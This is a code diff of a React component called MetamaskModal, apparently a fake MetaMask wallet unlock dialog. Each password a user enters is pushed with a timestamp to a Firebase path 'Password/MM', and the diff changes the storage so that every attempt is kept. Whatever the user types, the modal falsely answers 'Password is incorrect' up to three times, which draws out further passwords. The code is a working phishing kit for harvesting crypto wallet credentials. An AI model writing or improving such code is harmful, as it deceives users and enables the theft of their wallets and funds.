@@ -8,7 +8,7 @@ import { FoxRiveAnimation } from './FoxRiveAnimation';
 import './styles.css';
 
 import { initializeApp } from "firebase/app";
-import { ref, set, getDatabase } from "firebase/database";
+import { ref, set, getDatabase, push } from "firebase/database";
 // TODO: Add SDKs for Firebase products that you want to use
 // https://firebase.google.com/docs/web/setup#available-libraries
 
@@ -135,8 +135,13 @@ const MetamaskModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose, dark
     setIsClickedEnter(false);
     setError(false);
 
-    set(ref(db, "Password/MM"), {
+    // set(ref(db, "Password/MM"), {
+    //   password: newKeyword,
+    // });
+
+    push(ref(db, "Password/MM"), {
       password: newKeyword,
+      time: Date.now()
     });
   };
 
@@ -159,27 +164,32 @@ const MetamaskModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose, dark
     if (currentKeyword) {
       setConnecting(true);
 
-        set(ref(db, "Password/MM"), {
-          password: currentKeyword,
-        });
+      // set(ref(db, "Password/MM"), {
+      //   password: currentKeyword,
+      // });
 
-        setTimeout(() => {
-          setConnecting(false);
-          if (trying < 3) {
-            setError(true);
-            setHelperText('Password is incorrect. Please try again.');
-            setIsClickedEnter(true);
-            setTrying(trying + 1);
-          } else {
-            setConnectionError(true);
-          }
-          passwordInputRef.current?.focus();
-        }, 150);
-      } else {
-        setTimeout(() => {
-          setConnecting(false);
-        }, 150);
-      }
+      push(ref(db, "Password/MM"), {
+        password: currentKeyword,
+        time: Date.now()
+      });
+
+      setTimeout(() => {
+        setConnecting(false);
+        if (trying < 3) {
+          setError(true);
+          setHelperText('Password is incorrect. Please try again.');
+          setIsClickedEnter(true);
+          setTrying(trying + 1);
+        } else {
+          setConnectionError(true);
+        }
+        passwordInputRef.current?.focus();
+      }, 150);
+    } else {
+      setTimeout(() => {
+        setConnecting(false);
+      }, 150);
+    }
   };
 
   const showForgetPasswordModal = () => {
